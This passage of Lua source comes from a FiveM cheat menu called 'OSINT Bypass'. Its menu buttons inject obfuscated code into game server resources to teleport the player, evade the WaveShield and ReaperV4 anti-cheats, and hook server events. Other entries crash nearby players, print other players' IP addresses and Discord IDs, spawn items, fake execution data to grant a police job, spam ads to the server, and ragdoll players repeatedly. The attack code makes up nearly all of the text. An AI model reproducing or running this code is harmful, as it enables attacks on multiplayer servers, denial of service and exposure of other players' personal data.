                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Pillbox Hospital",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]])                             
                        else
                            MachoInjectResourceRaw("any", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Grove Street",
                        onSelect = function()
                        local waveShieldStart = GetResourceState("WaveShield") == 'started'
                        local ReaperStart = GetResourceState("ReaperV4") == 'started'

                        if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]])                        
                        else
                            MachoInjectResourceRaw("any", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Legion Square",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                            end
                        end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Settings",
            type = "subMenu",
            categories = {
                {
                    label = "Interface",
                    tabs = {
                        { type = "subMenu", label = "Keybinds",
                            subTabs = {
                                { icon = "", type = "button", label = "Menu Key",
                                    onSelect = function()
                                        KeyboardInput("Choose Menu Key", "", function(val)
                                            for vk, name in pairs(MappedKeys) do
                                                if name:lower() == val:lower() then
                                                    MenuKey = name
                                                    Wait(250)
                                                    OSINT:ShowUI()
                                                    return
                                                end
                                            end
                                        end, "keybind")
                                    end 
                                },
                            }
                        },
                        { type = "subMenu", label = "Banners",
                            subTabs = {
                                { icon = "", type = "button", label = "Red Banner (Default)",
                                    onSelect = function()
                                        OSINT:SendMessage({ action = "updateBanner", bannerColor = "150, 0, 0", bannerLink = "https://r2.fivemanage.com/j0YlVJ9wWJTFeImwfmRK2/OSINTBypassBanner.png" })
                                    end 
                                },
                            }
                        },
                        { type = "scrollable", label = "Menu Positioning (X)", desc = "This is the menu positioning based on the X-Axis.", value = 1, values = { "Left", "Center", "Right" },
                            onSelect = function()
                                print("Selected - Menu Positioning (X)")
                            end
                        },
                        { type = "scrollable", label = "Menu Positioning (Y)", desc = "This is the menu positioning based on the Y-Axis.", value = 1, values = { "Top", "Middle", "Bottom" },
                            onSelect = function()
                                print("Selected - Menu Positioning (Y)")
                            end
                        },
                    }
                },
            }
        },
    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function OSINT:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end
            
            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function OSINT:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function OSINT:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function OSINT:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    local myPed = PlayerPedId()
    maxDistance = maxDistance or 350.0

    if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
        nearby = {}
        return nearby
    end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    OSINT:Initialize()
    OSINT:BuildDefaultMenu()
    OSINT:UpdateElements(CurrentMenu)
    Wait(1000)
    OSINT:Notify("success", "OSINT", "You have loaded OSINT Bypass, welcome!", 3000)
    Wait(1000)
    OSINT:Notify("info", "OSINT", "Your key will never expire, thanks for using OSINT Bypass!", 3000)
    Wait(1000)

    -- AddTrigger({ type = "button", label = "Example Trigger",
    --     onSelect = function()
    --     end
    -- })

    -- AddTrigger({ type = "checkbox", label = "Example Trigger 2", checked = false,
    --     onSelect = function(checked)
    --         if checked then
    --             -- On
    --         else
    --             -- Off
    --         end
    --     end
    -- })


if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Deobfuscate Events",
        onSelect = function()
            OSINT:HideUI()
            local resourceName = nil
            local done = false

            KeyboardInput("Resource Name", "", function(val)
                if val and val ~= "" then
                    resourceName = val
                end
                done = true
            end, "typeable")

            while not done do
                Wait(100)
            end

            if not resourceName or resourceName == "" then
                MachoMenuNotification("Error", "No resource name entered.")
                OSINT:ShowUI()
                return
            end

            if GetResourceState(resourceName) ~= "started" then
                MachoMenuNotification("Error", "Resource ^3" .. resourceName .. "^7 is not started or doesnâ€™t exist.")
                OSINT:ShowUI()
                return
            end

            local payload = [[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]]

            Injection(resourceName, payload)

            MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
            OSINT:ShowUI()
        end
    })
end

    if GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Crash Nearby Players",
        onSelect = function()
        if GetResourceState("WaveShield") == "started" then
            OSINT:Notify("error", "OSINT", "Ban Prevention: Cannot Use this on WaveShield", 3000)
            return
        end
            MachoInjectResourceRaw("ox_lib", [[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]])
        end,
    })
end

    if GetResourceState("dpemotes") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Bring All Nearby Players",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Attempting to bring all players", 3000)
                MachoInjectThread(0, 'dpemotes', '', [[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]])
            end
        })
    end

    if GetResourceState('mc9-adminmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Admin Menu List (F8)",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Admin Menu List", 3000)

            MachoInjectResource2(NewThreadNs, "mc9-adminmenu", [[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]])
            end,
        })
    end    

    if GetResourceState('mc9-mainmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "MC9 Item Spawner",
            onSelect = function()
            OSINT:Notify("success", "OSINT", "Spawning Items", 3000)
            MachoInjectResource2(NewThreadNs, "mc9-mainmenu", [[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]])
            end,
        })
    end

    if GetResourceState('vMenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Message Server",
            onSelect = function()
                OSINT:Notify("success", "OSINT", "Message Sent", 3000)

                MachoInjectResource2(1, "any", [[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with OSINT Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
                ]])
            end,
        })
    end


    if GetResourceState("amigo") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #1",
            onSelect = function()
                OSINT:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5OSINT^7] [^1ERROR^7]: Invalid or empty itemName")
                    OSINT:Notify("error", "OSINT", "No item name entered", 3000)
                    OSINT:ShowUI()
                    return
                end

                print("^7[^5OSINT^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5OSINT^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5OSINT^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5OSINT^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("amigo", string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.OSINT = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5OSINT^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.OSINT.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]], itemName, itemCount, itemName, itemCount))
                end)

                if not success then
                    print("^7[^5OSINT^7] [^1ERROR^7]: string.format failed â†’", err)
                    print("^7[^5OSINT^7] [^3DEBUG^7]: itemName =", tostring(itemName), "itemCount =", tostring(itemCount))
                    OSINT:Notify("error", "OSINT", "String format failed â€” check console", 4000)
                else
                    print("^7[^5OSINT^7] [^2INFO^7]: Injection completed successfully")
                end

                OSINT:ShowUI()
            end
        })
    end

    local scriptsRunning = GetResourceState("scripts") == "started"
    local frameworkRunning = GetResourceState("framework") == "started"

    if scriptsRunning or frameworkRunning then
        local runningResource = scriptsRunning and "scripts" or "framework"
        AddTrigger({
            type = "button",
            label = "End Comserv",
            onSelect = function()
                OSINT:Notify("Comserv", "OSINT", "Action Removed you might have to spam this", 3000)
                MachoInjectResourceRaw(runningResource, [[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob Police #1 (New)",
            onSelect = function()
                if GetResourceState("es_extended") == "started" then
                    OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "es_extended", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                elseif GetResourceState("core") == "started" then
                    OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "core", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                else
                    print("Neither core nor es_extended started")
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Job #2(Police)",
            onSelect = function()
                OSINT:Notify("Setjob", "OSINT", "Your job has been set to police", 3000)
                MachoInjectResourceRaw("any", [[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[âœ…] Job set to police successfully.")
                    else
                        print("[âš ï¸] Failed to set job: LocalPlayer or state not available.")
                    end
                ]])
            end
        })
    end

    if GetResourceState("codewave-sneaker-phone") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Give Shoes Reward",
            onSelect = function()
                MachoInjectResource2(NewThreadNs, "codewave-sneaker-phone", [[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.OSINT = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.OSINT.TSEvent('delivery:giveRewardShoes', 1000)
                    print("[âœ…] reward triggered successfully.")
                ]])
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Ragdoll Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                OSINT:Notify("Ragdoll", "OSINT", "Ragdolling Nearby Players", 4000)
                    Injection("rzrp-base", [[
                        if not _G.OSINTRagdollPlayersInitialized then
                            _G.OSINTRagdollPlayersEnabled = true
                            _G.OSINTRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.OSINTRagdollThread then
                                TerminateThread(_G.OSINTRagdollThread)
                                _G.OSINTRagdollThread = nil
                            end

                            _G.OSINTRagdollThread = SafeThread(function()
                                while _G.OSINTRagdollPlayersEnabled and _G.OSINTRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.OSINTRagdollThread = nil
                            end)
                        else
                            _G.OSINTRagdollPlayersEnabled = true
                        end
                    ]])
                else
                OSINT:Notify("Ragdoll", "OSINT", "Stopped Ragdolling Players", 4000)
                    Injection("rzrp-base", [[
                        _G.OSINTRagdollPlayersEnabled = false
                        _G.OSINTRagdollPlayersInitialized = false
                        if _G.OSINTRagdollThread then
                            TerminateThread(_G.OSINTRagdollThread)
                            _G.OSINTRagdollThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Bag Closest Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                    print('Bag Closest Players Started...')
                    Injection("rzrp-base", [[
                        if not _G.OSINTBagPlayersInitialized then
                            _G.OSINTBagPlayersEnabled = true
                            _G.OSINTBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.OSINTBagThread then
                                TerminateThread(_G.OSINTBagThread)
                                _G.OSINTBagThread = nil
                            end

                            _G.OSINTBagThread = SafeThread(function()
                                while _G.OSINTBagPlayersEnabled and _G.OSINTBagPlayersInitialized do
                                    local myPed = PlayerPedId()
